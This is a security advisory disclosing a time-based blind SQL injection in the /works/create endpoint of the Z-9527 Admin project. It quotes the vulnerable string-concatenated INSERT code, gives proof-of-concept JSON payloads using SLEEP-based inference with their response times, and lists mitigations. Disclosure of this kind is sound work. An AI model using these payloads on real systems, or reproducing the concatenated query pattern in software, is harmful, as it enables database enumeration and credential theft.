# SQL Blind Injection Vulnerability in Z-9527 Admin

> **Software and Affected Version:** [Z-9527 Admin](https://github.com/z-9527/admin) ≤ commit 72aaf2d

## Affected Files

-   `/server/routes/works.js`
-   `/server/controller/works.js`

## Description

A SQL blind injection vulnerability exists in [Z-9527 Admin](https://github.com/z-9527/admin) ≤ commit 72aaf2d at the `/works/create` endpoint, where the `description` field in the request body is concatenated directly into a SQL statement without sanitization or parameterization. As a result, authenticated attackers can inject malicious SQL payloads using time-based blind-injection techniques to infer sensitive database information character-by-character through response-time analysis. This enables complete database enumeration, credential extraction, and potential privilege escalation. Mitigations include immediately replacing string concatenation with parameterized queries or prepared statements, implementing strict input validation and sanitization for all user-supplied parameters, applying the principle of least privilege to database connections, deploying web application firewalls with SQL injection detection rules, and conducting comprehensive security audits of all database query construction patterns across the codebase.

## Code Analysis

In `/server/routes/works.js`:

```js
router.post('/create', async function (ctx, next) {
    const sessionId = ctx.cookies.get('sessionId');
    const res = await createWorks(ctx.request.body, sessionId);
    handleRes(ctx, next, res);
});
```

In `/server/controller/works.js`:

```js
const createWorks = async (param, sessionId) => {
    const { title, description, url, githubUrl } = param;
    const loginName = jwt.verify(sessionId, TOKEN_SECRETKEY).username;
    const isAdminRes = await isAdmin(loginName);
    if (!isAdminRes) {
        return new ErrorModel({
            message: '暂无权限'
        });
    }
    const sql = `insert into works (author,createTime,title,description, url, githubUrl) values
     ('${loginName}',${Date.now()},'${title}','${description}','${url}','${githubUrl}')`;
    const res = await exec(sql);
    if (res.affectedRows) {
        return new SuccessModel({
            data: { id: res.insertId },
            message: '创建成功'
        });
    } else {
        return new ErrorModel({
            message: '创建失败',
            httpCode: 500
        });
    }
};
```

The user input is directly concatenated into the SQL statement.

## Proof of Concept

Assuming the current database is `admin`, sending the following payload to `/works/create` returned a response after approximately 1018 ms:

```json
{
    "title": "test1",
    "description": "1' and IF(SUBSTRING((SELECT DATABASE()), 1, 1) = 'a', SLEEP(1), 1) or '",
    "url": "https://github.com",
    "githubUrl": "https://github.com"
}
```

![](./assets/sqli-1.png)

Assuming the current database is `admin`, sending the following payload to `/works/create` returned a response after approximately 14 ms:

```json
{
    "title": "test2",
    "description": "1' and IF(SUBSTRING((SELECT DATABASE()), 1, 1) = 'b', SLEEP(1), 1) or '",
    "url": "https://github.com",
    "githubUrl": "https://github.com"
}
```

![](./assets/sqli-2.png)
